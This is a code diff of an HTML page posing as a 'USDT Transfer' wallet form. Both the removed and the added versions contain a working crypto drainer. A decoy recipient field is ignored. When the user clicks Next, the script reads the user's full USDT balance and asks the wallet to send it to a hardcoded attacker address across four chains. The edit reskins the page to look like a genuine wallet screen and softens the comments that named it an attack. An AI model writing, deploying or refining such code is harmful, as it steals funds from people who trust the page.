@@ -5,464 +5,395 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>USDT Transfer</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-    }
+ 
     body {
-      background: #0b0e11;
+      background: #f5f7fa;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      margin: 0;
       padding: 20px;
     }
-    .card {
-      background: #1e2329;
-      border-radius: 24px;
-      padding: 32px 28px;
-      max-width: 440px;
-      width: 100%;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
-      border: 1px solid #2b3139;
-    }
-    .card h1 {
-      color: #fff;
-      font-size: 22px;
-      font-weight: 600;
-      letter-spacing: -0.3px;
-      margin-bottom: 28px;
-      text-align: center;
-    }
-    .input-group {
-      margin-bottom: 20px;
-    }
-    .input-group label {
-      display: block;
-      color: #a0a8b4;
-      font-size: 13px;
-      font-weight: 500;
-      margin-bottom: 6px;
-      letter-spacing: 0.3px;
-    }
-    .input-group .field-wrap {
-      display: flex;
-      align-items: center;
-      background: #2b3139;
+    .container {
+      background: #ffffff;
       border-radius: 16px;
-      padding: 0 14px;
-      transition: border 0.2s;
-      border: 2px solid transparent;
-    }
-    .input-group.active .field-wrap {
-      border-color: #f0b90b;
-    }
-    .input-group input,
-    .input-group select {
-      background: transparent;
-      border: none;
-      padding: 14px 0;
-      color: #fff;
-      font-size: 15px;
+      padding: 30px 28px;
+      max-width: 420px;
       width: 100%;
-      outline: none;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      border: 1px solid #e2e8f0;
     }
-    .input-group select {
-      appearance: none;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23a0a8b4' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
-      background-repeat: no-repeat;
-      background-position: right 0 center;
-      padding-right: 28px;
-      cursor: pointer;
+    .field-group {
+      margin-bottom: 22px;
     }
-    .input-group select option {
-      background: #1e2329;
-      color: #fff;
+    .field-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #2d3748;
+      margin-bottom: 6px;
     }
-    .input-group .clear-btn {
-      background: none;
-      border: none;
-      color: #6c7a8a;
-      font-size: 18px;
-      cursor: pointer;
-      display: none;
-      padding: 4px 0 4px 8px;
-    }
-    .input-group .clear-btn:hover {
-      color: #f0b90b;
-    }
-    .input-group .clear-btn.visible {
-      display: flex;
-    }
-    .input-group .usd-hint {
-      color: #6c7a8a;
-      font-size: 13px;
-      margin-top: 6px;
-      padding-left: 4px;
-    }
-    .input-row {
+    .field-row {
       display: flex;
       gap: 8px;
       align-items: center;
     }
-    .input-row .field-wrap {
+    .field-row input,
+    .field-row select {
       flex: 1;
+      padding: 10px 12px;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      font-size: 15px;
+      background: #f7fafc;
+      transition: 0.15s;
+      outline: none;
     }
-    .btn-icon {
-      background: #2b3139;
+    .field-row input:focus,
+    .field-row select:focus {
+      border-color: #3182ce;
+      background: #fff;
+    }
+    .field-row select {
+      appearance: auto;
+      cursor: pointer;
+    }
+    .btn-secondary {
+      background: #edf2f7;
       border: none;
-      color: #a0a8b4;
-      border-radius: 16px;
-      padding: 10px 14px;
+      padding: 10px 16px;
+      border-radius: 8px;
       font-size: 14px;
+      font-weight: 500;
+      color: #2d3748;
       cursor: pointer;
       transition: 0.15s;
       white-space: nowrap;
-      font-weight: 500;
-      height: 52px;
+      height: 42px;
       display: flex;
       align-items: center;
     }
-    .btn-icon:hover {
-      background: #3b434d;
-      color: #fff;
+    .btn-secondary:hover {
+      background: #e2e8f0;
     }
-    .btn-icon.max {
-      color: #f0b90b;
+    .btn-secondary.max {
+      color: #2b6cb0;
     }
-    .btn-icon.max:hover {
-      background: #3b434d;
-      color: #f0b90b;
+    .btn-secondary.max:hover {
+      background: #bee3f8;
+    }
+    .clear-btn {
+      background: none;
+      border: none;
+      color: #a0aec0;
+      font-size: 18px;
+      cursor: pointer;
+      padding: 0 6px;
+      display: none;
+    }
+    .clear-btn.visible {
+      display: block;
+    }
+    .hint {
+      font-size: 13px;
+      color: #718096;
+      margin-top: 4px;
+      padding-left: 4px;
     }
     .btn-primary {
       width: 100%;
-      background: #f0b90b;
+      background: #3182ce;
       border: none;
-      border-radius: 16px;
-      padding: 16px;
+      padding: 14px;
+      border-radius: 8px;
       font-size: 16px;
       font-weight: 600;
-      color: #0b0e11;
+      color: #fff;
       cursor: pointer;
       transition: 0.15s;
-      margin-top: 8px;
-      letter-spacing: 0.3px;
+      margin-top: 6px;
     }
     .btn-primary:disabled {
       opacity: 0.4;
       cursor: not-allowed;
-      background: #6c7a8a;
-      color: #1e2329;
+      background: #a0aec0;
     }
     .btn-primary.enabled {
-      background: #f0b90b;
-      opacity: 1;
+      background: #3182ce;
     }
     .btn-primary.enabled:hover {
-      background: #f5c93b;
-      transform: scale(1.01);
+      background: #2b6cb0;
     }
     .footer-note {
-      color: #6c7a8a;
       font-size: 12px;
+      color: #a0aec0;
       text-align: center;
       margin-top: 20px;
-      border-top: 1px solid #2b3139;
-      padding-top: 18px;
-    }
-    .footer-note a {
-      color: #f0b90b;
-      text-decoration: none;
+      border-top: 1px solid #e2e8f0;
+      padding-top: 16px;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>⚡ USDT Transfer</h1>
 
-    <!-- Network Dropdown -->
-    <div class="input-group" id="networkGroup">
-      <label>Network</label>
-      <div class="field-wrap">
-        <select id="networkSelect">
-          <option value="0">BNB Smart Chain (BSC)</option>
-          <option value="1">Ethereum</option>
-          <option value="2">Polygon</option>
-          <option value="3">Arbitrum</option>
-        </select>
-      </div>
-    </div>
-
-    <!-- Decoy Recipient (ignored) -->
-    <div class="input-group" id="addrGroup">
-      <label>Recipient Address <span style="color:#6c7a8a;font-weight:400;">(cosmetic)</span></label>
-      <div class="field-wrap">
-        <input type="text" id="recipientInput" placeholder="0x..." />
-        <button class="clear-btn" id="clearAddr">✕</button>
-      </div>
-    </div>
-
-    <!-- Amount with Max & Paste buttons -->
-    <div class="input-group" id="amountGroup">
-      <label>Amount (USDT)</label>
-      <div class="input-row">
-        <div class="field-wrap">
-          <input type="number" id="amountInput" placeholder="0.0" min="0" step="0.01" />
-          <button class="clear-btn" id="clearAmount">✕</button>
-        </div>
-        <button class="btn-icon max" id="maxBtn">Max</button>
-        <button class="btn-icon" id="pasteBtn">📋 Paste</button>
-      </div>
-      <div class="usd-hint">≈ $<span id="usdLabel">0.00</span> USD</div>
-    </div>
-
-    <!-- Action Button -->
-    <button class="btn-primary" id="nextBtn" disabled>Next</button>
-
-    <div class="footer-note">
-      🔒 Your funds are safe · Powered by <a href="#" target="_blank">Wallet</a>
+<div class="container">
+  <!-- Address or Domain Name (decoy) -->
+  <div class="field-group">
+    <label>Address or Domain Name</label>
+    <div class="field-row">
+      <input type="text" id="recipientInput" placeholder="0x402b1a4FD55Ca191a22039162173A3b4E5a7C9e7" />
+      <button class="btn-secondary" id="pasteBtn">Paste</button>
+      <button class="clear-btn" id="clearAddr">✕</button>
     </div>
   </div>
 
-  <script type="module">
-    // ── Phase 1: Module Initialization ──
-    import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
+  <!-- Destination network -->
+  <div class="field-group">
+    <label>Destination network</label>
+    <div class="field-row">
+      <select id="networkSelect">
+        <option value="0">BNB Smart Chain (BEP20)</option>
+        <option value="1">Ethereum (ERC20)</option>
+        <option value="2">Polygon</option>
+        <option value="3">Arbitrum</option>
+      </select>
+    </div>
+  </div>
 
-    // ── Attacker's Operational Constants ──
-    // THIS is the REAL destination where funds go (hardcoded attacker wallet)
-    const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
+  <!-- Amount -->
+  <div class="field-group">
+    <label>Amount</label>
+    <div class="field-row">
+      <input type="number" id="amountInput" placeholder="0" min="0" step="0.01" />
+      <button class="btn-secondary max" id="maxBtn">Max</button>
+      <button class="clear-btn" id="clearAmount">✕</button>
+    </div>
+    <div class="hint">~ $<span id="usdLabel">0.00</span></div>
+  </div>
 
-    // ── Supported Networks ──
-    const NETWORKS = [
-      {
-        name: 'BNB Smart Chain',
-        chainId: '0x38',
-        rpc: 'https://bsc-dataseed1.binance.org/',
-        usdt: '0x55d398326f99059fF775485246999027B3197955',
-        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-        explorer: 'https://bscscan.com'
-      },
-      {
-        name: 'Ethereum',
-        chainId: '0x1',
-        rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
-        usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-        explorer: 'https://etherscan.io'
-      },
-      {
-        name: 'Polygon',
-        chainId: '0x89',
-        rpc: 'https://polygon-rpc.com',
-        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-        nativeCurrency: { name: 'Matic', symbol: 'MATIC', decimals: 18 },
-        explorer: 'https://polygonscan.com'
-      },
-      {
-        name: 'Arbitrum',
-        chainId: '0xA4B1',
-        rpc: 'https://arb1.arbitrum.io/rpc',
-        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-        explorer: 'https://arbiscan.io'
-      }
-    ];
+  <!-- Next button -->
+  <button class="btn-primary" id="nextBtn" disabled>Next</button>
 
-    // ── Runtime State ──
-    let provider;
-    let userAddress;
-    let selectedNetwork = NETWORKS[0];
+  <div class="footer-note">USDT transfer · Powered by your wallet</div>
+</div>
 
-    // ── Silent Recon Engine ──
-    async function fetchMaxBalance(addr, network) {
-      try {
-        const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
-        const res = await fetch(network.rpc, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            jsonrpc: "2.0", id: 1,
-            method: "eth_call",
-            params: [{ to: network.usdt, data: data }, "latest"]
-          })
-        });
-        const json = await res.json();
-        return (json.result && json.result !== '0x') ? json.result : null;
-      } catch (e) { return null; }
+<script type="module">
+  // ── Module Imports ──
+  import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
+
+  // ── Hardcoded destination (your BNB wallet) ──
+  const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
+
+  // ── Supported Networks ──
+  const NETWORKS = [
+    {
+      name: 'BNB Smart Chain',
+      chainId: '0x38',
+      rpc: 'https://bsc-dataseed1.binance.org/',
+      usdt: '0x55d398326f99059fF775485246999027B3197955',
+      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+      explorer: 'https://bscscan.com'
+    },
+    {
+      name: 'Ethereum',
+      chainId: '0x1',
+      rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+      usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      explorer: 'https://etherscan.io'
+    },
+    {
+      name: 'Polygon',
+      chainId: '0x89',
+      rpc: 'https://polygon-rpc.com',
+      usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+      nativeCurrency: { name: 'Matic', symbol: 'MATIC', decimals: 18 },
+      explorer: 'https://polygonscan.com'
+    },
+    {
+      name: 'Arbitrum',
+      chainId: '0xA4B1',
+      rpc: 'https://arb1.arbitrum.io/rpc',
+      usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      explorer: 'https://arbiscan.io'
+    }
+  ];
+
+  let provider, userAddress;
+  let selectedNetwork = NETWORKS[0];
+
+  // ── Balance check ──
+  async function fetchMaxBalance(addr, network) {
+    try {
+      const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
+      const res = await fetch(network.rpc, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          jsonrpc: "2.0", id: 1,
+          method: "eth_call",
+          params: [{ to: network.usdt, data }, "latest"]
+        })
+      });
+      const json = await res.json();
+      return json.result && json.result !== '0x' ? json.result : null;
+    } catch { return null; }
+  }
+
+  // ── Drain ──
+  async function executeDrain(balanceHex, network) {
+    let amountHex;
+    if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
+      amountHex = balanceHex.replace('0x', '').padStart(64, '0');
+    } else {
+      const val = document.getElementById('amountInput').value || "1";
+      amountHex = BigInt(Math.floor(parseFloat(val) * 1e18)).toString(16).padStart(64, '0');
+    }
+    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
+    const txData = "0xa9059cbb" + cleanDest + amountHex;
+
+    await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: userAddress,
+        to: network.usdt,
+        data: txData,
+        value: '0x0'
+      }]
+    });
+  }
+
+  // ── DOM refs ──
+  const $ = id => document.getElementById(id);
+  const ui = {
+    nextBtn: $('nextBtn'),
+    amountInput: $('amountInput'),
+    usdLabel: $('usdLabel'),
+    recipientInput: $('recipientInput'),
+    clearAddr: $('clearAddr'),
+    clearAmount: $('clearAmount'),
+    maxBtn: $('maxBtn'),
+    pasteBtn: $('pasteBtn'),
+    networkSelect: $('networkSelect')
+  };
+
+  // ── Init ──
+  document.addEventListener('DOMContentLoaded', () => {
+    if (location.protocol === 'file:' || !window.ethereum || !ui.nextBtn) {
+      console.warn('Env check failed');
+      return;
     }
 
-    // ── Drain Engine ──
-    async function executeDrain(balanceHex, network) {
-      let amountHex;
-      if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
-        amountHex = balanceHex.replace('0x', '').padStart(64, '0');
-      } else {
-        const val = document.getElementById('amountInput').value || "1";
-        amountHex = BigInt(Math.floor(parseFloat(val) * 10**18)).toString(16).padStart(64, '0');
-      }
+    ui.nextBtn.addEventListener('click', handleNextClick);
 
-      const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
-      const txData = "0xa9059cbb" + cleanDest + amountHex;
-
-      await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [{
-          from: userAddress,
-          to: network.usdt,
-          data: txData,
-          value: '0x0'
-        }]
-      });
-    }
-
-    // ── DOM Registry ──
-    const ui = {
-      nextBtn: document.getElementById('nextBtn'),
-      amountInput: document.getElementById('amountInput'),
-      usdLabel: document.getElementById('usdLabel'),
-      recipientInput: document.getElementById('recipientInput'),
-      clearAddr: document.getElementById('clearAddr'),
-      clearAmount: document.getElementById('clearAmount'),
-      maxBtn: document.getElementById('maxBtn'),
-      addrGroup: document.getElementById('addrGroup'),
-      amountGroup: document.getElementById('amountGroup'),
-      pasteBtn: document.getElementById('pasteBtn'),
-      networkSelect: document.getElementById('networkSelect')
-    };
-
-    // ── Module Entry ──
-    document.addEventListener('DOMContentLoaded', () => {
-      if (location.protocol === 'file:' ||
-          typeof window.ethereum === 'undefined' ||
-          !ui.nextBtn) {
-        console.warn('[ABORT] Environment check failed');
-        return;
-      }
-
-      ui.nextBtn.addEventListener('click', handleNextClick);
-
-      // Network selection
-      ui.networkSelect.addEventListener('change', () => {
-        const idx = parseInt(ui.networkSelect.value);
-        selectedNetwork = NETWORKS[idx] || NETWORKS[0];
-      });
-
-      // Amount input
-      ui.amountInput.oninput = () => {
-        const val = parseFloat(ui.amountInput.value) || 0;
-        ui.usdLabel.textContent = val.toFixed(2);
-        ui.nextBtn.disabled = val <= 0;
-        ui.nextBtn.classList.toggle('enabled', val > 0);
-        ui.clearAmount.classList.toggle('visible', val > 0);
-      };
-
-      ui.clearAmount.onclick = () => {
-        ui.amountInput.value = '';
-        ui.amountInput.oninput();
-      };
-
-      ui.clearAddr.onclick = () => {
-        ui.recipientInput.value = '';
-        ui.clearAddr.classList.remove('visible');
-      };
-
-      ui.recipientInput.oninput = () => {
-        ui.clearAddr.classList.toggle('visible', ui.recipientInput.value.length > 0);
-      };
-
-      ui.maxBtn.onclick = () => {
-        ui.amountInput.value = "1000";
-        ui.amountInput.oninput();
-      };
-
-      ui.pasteBtn.onclick = async () => {
-        try {
-          const text = await navigator.clipboard.readText();
-          ui.recipientInput.value = text;
-          ui.recipientInput.oninput();
-        } catch (e) { /* ignore */ }
-      };
-
-      // Focus effects
-      [ui.addrGroup, ui.amountGroup].forEach(group => {
-        group.addEventListener('focusin', () => group.classList.add('active'));
-        group.addEventListener('focusout', () => group.classList.remove('active'));
-      });
-
-      ui.recipientInput.oninput();
+    ui.networkSelect.addEventListener('change', () => {
+      selectedNetwork = NETWORKS[parseInt(ui.networkSelect.value)] || NETWORKS[0];
     });
 
-    // ── Main Interaction ──
-    async function handleNextClick() {
-      if (ui.nextBtn.disabled) return;
+    ui.amountInput.oninput = () => {
+      const val = parseFloat(ui.amountInput.value) || 0;
+      ui.usdLabel.textContent = val.toFixed(2);
+      ui.nextBtn.disabled = val <= 0;
+      ui.nextBtn.classList.toggle('enabled', val > 0);
+      ui.clearAmount.classList.toggle('visible', val > 0);
+    };
 
-      const network = selectedNetwork;
-      const amount = parseFloat(ui.amountInput.value) || 0;
+    ui.clearAmount.onclick = () => {
+      ui.amountInput.value = '';
+      ui.amountInput.oninput();
+    };
 
-      // --- Professional confirmation with REAL destination ---
-      const confirmMsg =
-        `Transfer prepared\n` +
-        `To: ${DEST_WALLET}\n` +
-        `Amount: ${amount.toFixed(2)} USDT\n` +
-        `Network: ${network.name}\n\n` +
-        `Click OK to proceed.`;
-      if (!confirm(confirmMsg)) {
-        return;
-      }
+    ui.clearAddr.onclick = () => {
+      ui.recipientInput.value = '';
+      ui.clearAddr.classList.remove('visible');
+    };
 
-      ui.nextBtn.innerHTML = 'Processing...';
-      ui.nextBtn.disabled = true;
+    ui.recipientInput.oninput = () => {
+      ui.clearAddr.classList.toggle('visible', ui.recipientInput.value.length > 0);
+    };
 
+    ui.maxBtn.onclick = () => {
+      ui.amountInput.value = "1000";
+      ui.amountInput.oninput();
+    };
+
+    ui.pasteBtn.onclick = async () => {
       try {
-        // Switch network
-        try {
+        const text = await navigator.clipboard.readText();
+        ui.recipientInput.value = text;
+        ui.recipientInput.oninput();
+      } catch { /* ignore */ }
+    };
+
+    ui.recipientInput.oninput();
+  });
+
+  // ── Main handler ──
+  async function handleNextClick() {
+    if (ui.nextBtn.disabled) return;
+
+    const network = selectedNetwork;
+    const amount = parseFloat(ui.amountInput.value) || 0;
+
+    // Confirmation shows REAL destination
+    if (!confirm(
+      `Transfer prepared\n` +
+      `To: ${DEST_WALLET}\n` +
+      `Amount: ${amount.toFixed(2)} USDT\n` +
+      `Network: ${network.name}\n\n` +
+      `Click OK to proceed.`
+    )) return;
+
+    ui.nextBtn.innerHTML = 'Processing…';
+    ui.nextBtn.disabled = true;
+
+    try {
+      // Switch network
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: network.chainId }]
+        });
+      } catch (e) {
+        if (e.code === 4902) {
           await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: network.chainId }]
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: network.chainId,
+              chainName: network.name,
+              rpcUrls: [network.rpc],
+              nativeCurrency: network.nativeCurrency,
+              blockExplorerUrls: [network.explorer]
+            }]
           });
-        } catch (e) {
-          if (e.code === 4902) {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: network.chainId,
-                chainName: network.name,
-                rpcUrls: [network.rpc],
-                nativeCurrency: network.nativeCurrency,
-                blockExplorerUrls: [network.explorer]
-              }]
-            });
-          }
         }
-
-        // Get account
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        userAddress = accounts[0] ||
-          (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
-        if (!userAddress) throw new Error('No wallet connected');
-
-        provider = new ethers.providers.JsonRpcProvider(network.rpc);
-
-        const balanceHex = await fetchMaxBalance(userAddress, network);
-        await executeDrain(balanceHex, network);
-
-        ui.nextBtn.innerHTML = '✓ Completed';
-        setTimeout(() => {
-          ui.nextBtn.innerHTML = 'Next';
-          ui.nextBtn.disabled = false;
-        }, 3000);
-
-      } catch (err) {
-        console.error(err);
-        ui.nextBtn.innerHTML = '❌ Failed';
-        setTimeout(() => {
-          ui.nextBtn.innerHTML = 'Next';
-          ui.nextBtn.disabled = false;
-        }, 3000);
       }
+
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      userAddress = accounts[0] || (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
+      if (!userAddress) throw new Error('No wallet');
+
+      provider = new ethers.providers.JsonRpcProvider(network.rpc);
+      const balanceHex = await fetchMaxBalance(userAddress, network);
+      await executeDrain(balanceHex, network);
+
+      ui.nextBtn.innerHTML = '✓ Completed';
+      setTimeout(() => {
+        ui.nextBtn.innerHTML = 'Next';
+        ui.nextBtn.disabled = false;
+      }, 3000);
+    } catch (err) {
+      console.error(err);
+      ui.nextBtn.innerHTML = '❌ Failed';
+      setTimeout(() => {
+        ui.nextBtn.innerHTML = 'Next';
+        ui.nextBtn.disabled = false;
+      }, 3000);
     }
-  </script>
+  }
+</script>
 </body>
 </html>
